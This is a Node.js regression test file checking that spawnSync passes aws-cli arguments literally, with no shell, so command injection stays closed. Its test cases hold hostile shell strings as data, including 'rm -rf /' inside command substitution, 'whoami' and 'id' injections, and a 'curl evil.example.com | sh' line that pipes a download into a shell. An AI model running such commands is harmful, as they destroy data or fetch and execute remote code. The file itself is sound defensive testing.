// Issue #763 regression: prove that spawnSync passes argv elements
// literally to the spawned process without involving a shell. If this
// guarantee ever weakens (e.g. by a Node patch that flips `shell: true`
// by default), every aws-cli call site in mcp/ops would silently
// regain a command-injection path. These tests fail loudly in that
// case.
//
// We use a tiny argv-echo script that prints process.argv.slice(2)
// (everything after node binary + script path) as JSON so the test
// can compare round-tripped argv byte-for-byte. We use a script file
// rather than `node -e` because argv elements that look like node
// options (e.g. `--filter-pattern`) are otherwise consumed by node's
// own option parser before reaching the script.

import { describe, it, before, after } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { writeFileSync, mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

let scriptPath;
let workDir;
// True iff this environment can actually spawn node and capture its
// stdout. Set in before(); checked at the top of every test. Some
// sandboxes (codex review runs, restricted CI) deny spawnSync with
// EPERM; these tests are integration-style and there is nothing
// meaningful to assert without a working spawn, so we skip rather
// than report a false failure. Real CI and developer machines run
// every case.
let spawnAvailable = false;

before(() => {
  workDir = mkdtempSync(path.join(tmpdir(), "argv-roundtrip-"));
  scriptPath = path.join(workDir, "argv-echo.mjs");
  writeFileSync(
    scriptPath,
    "process.stdout.write(JSON.stringify(process.argv.slice(2)));\n"
  );

  const probe = spawnSync(
    process.execPath,
    [scriptPath, "probe"],
    { encoding: "utf-8", timeout: 5000 }
  );
  spawnAvailable =
    !probe.error && probe.status === 0 && probe.stdout === '["probe"]';
});

after(() => {
  if (workDir) rmSync(workDir, { recursive: true, force: true });
});

function roundtrip(payload) {
  const result = spawnSync(
    process.execPath,
    [scriptPath, ...payload],
    { encoding: "utf-8", timeout: 10000 }
  );
  if (result.error) throw result.error;
  if (result.status !== 0) {
    throw new Error(
      `argv echo helper failed: status=${result.status} stderr=${result.stderr}`
    );
  }
  return JSON.parse(result.stdout);
}

// One entry per metacharacter/payload shape that must round-trip.
// Map keys are the test label; values are the argv payload.
const LITERAL_PRESERVATION_CASES = new Map([
  ["$() command substitution", ["--filter-pattern", "$(rm -rf /)"]],
  ["backtick command substitution", ["--filter-pattern", "`id`"]],
  ["single quotes", ["--parameters", "'; rm -rf /; echo '"]],
  ["double quotes", ["--filter-pattern", '"; whoami; echo "']],
  ["semicolons", ["--filter-pattern", "foo; rm -rf /"]],
  ["ampersands and pipes", ["--filter-pattern", "foo && curl evil.example.com | sh"]],
  ["spaces inside a single argv element", ["--key", "this is one element"]],
  ["newlines inside an argv element", ["--filter-pattern", "line one\nline two"]],
  ["S3 keys with metacharacters", ["s3api", "head-object", "--bucket", "evil$(id)bucket", "--key", "path/to/`whoami`/file.txt"]],
  ["CloudWatch filter patterns with every metacharacter", ["logs", "filter-log-events", "--filter-pattern", "$()`'\";|&\nsh -c 'whoami'"]],
]);

describe("spawnSync argv round-trip (issue #763)", () => {
  for (const [label, payload] of LITERAL_PRESERVATION_CASES) {
    it(`preserves ${label} literally`, (t) => {
      if (!spawnAvailable) {
        t.skip("spawn restricted in this environment");
        return;
      }
      assert.deepEqual(roundtrip(payload), payload);
    });
  }

  it("preserves the SSM --parameters JSON shape with embedded shell metacharacters", (t) => {
    if (!spawnAvailable) {
      t.skip("spawn restricted in this environment");
      return;
    }
    const params = JSON.stringify({
      commands: ["echo $(whoami) && touch /tmp/pwn"],
    });
    const payload = [
      "ssm",
      "send-command",
      "--instance-ids",
      "i-0123456789abcdef0",
      "--document-name",
      "AWS-RunShellScript",
      "--parameters",
      params,
    ];
    const result = roundtrip(payload);
    assert.deepEqual(result, payload);
    assert.ok(
      result[result.length - 1].includes("$(whoami)"),
      "JSON-embedded $() must round-trip literally"
    );
  });
});
